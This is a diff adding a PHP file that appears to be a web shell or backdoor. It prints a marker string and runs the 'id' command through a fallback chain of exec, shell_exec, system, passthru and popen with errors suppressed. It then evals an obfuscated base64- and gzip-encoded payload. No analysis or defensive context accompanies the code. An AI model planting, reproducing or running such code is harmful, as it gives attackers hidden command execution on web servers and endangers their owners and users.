@@ -1,0 +1,38 @@
+<?php
+echo "CabaL";
+$cmd="id";
+$eseguicmd=ex($cmd);
+echo $eseguicmd;
+function ex($cfe){
+$res = '';
+if (!empty($cfe)){
+if(function_exists('exec')){
+@exec($cfe,$res);
+$res = join("\n",$res);
+}
+elseif(function_exists('shell_exec')){
+$res = @shell_exec($cfe);
+}
+elseif(function_exists('system')){
+@ob_start();
+@system($cfe);
+$res = @ob_get_contents();
+@ob_end_clean();
+}
+elseif(function_exists('passthru')){
+@ob_start();
+@passthru($cfe);
+$res = @ob_get_contents();
+@ob_end_clean();
+}
+elseif(@is_resource($f = @popen($cfe,"r"))){
+$res = "";
+while(!@feof($f)) { $res .= @fread($f,1024); }
+@pclose($f);
+}}
+return $res;
+}
+eval(gzuncompress(base64_decode("eJwFwUmSqjAAANC79MouFigghOoVgsikDIIIm18khFmCRCZP/9/Dc9btyu/UI/IaRkzpDmYUi8K/HCOS490PthZ9ybnYbxVFcU88l1HRGU6pOC2PfCB1o1obBYXX3kBgssae4fnWCDFMBk7sHCj713Rtgd+0SC+Czs5atH9eMWwkx+3eevD4PB8dJYdeQKm3rsornOOPoDwGLvT6UbWJO0tQzWJUTGt8Kmf3Sj3PW51muCo1aLQX4tyGqeyMXACr8B9OpA1nQaCJvufWYnrk74+ovG6XOqmlCBvlHFpVwBcxGFMjYVXRvVjy8e1sj8tsHTQpWXKUGXopmYEWr/ttLpL+Hpw78xZl89Ng8dmBGgSvlXFV35fEU+Tj5cS5piBdqL0/kBvqDzLXDWSMAFUrBidqn2WFs266VHHdN3/JNyjZzhpPaj+dgZeuAgph+ARVaN0yljbNsyXoaxujUJfD/gzYxDQLw23e3RST4Au3Y3XjMaB6JBy+cRn4ZTxrhSWtRBYIYuSpS5Z4sI91Mowi0u5hXmFLPJrJ4a5Dl7/TKaLaMx9nmfFR+CJi/fP7+/v3H0nDruo=")));
+exit;
+
+
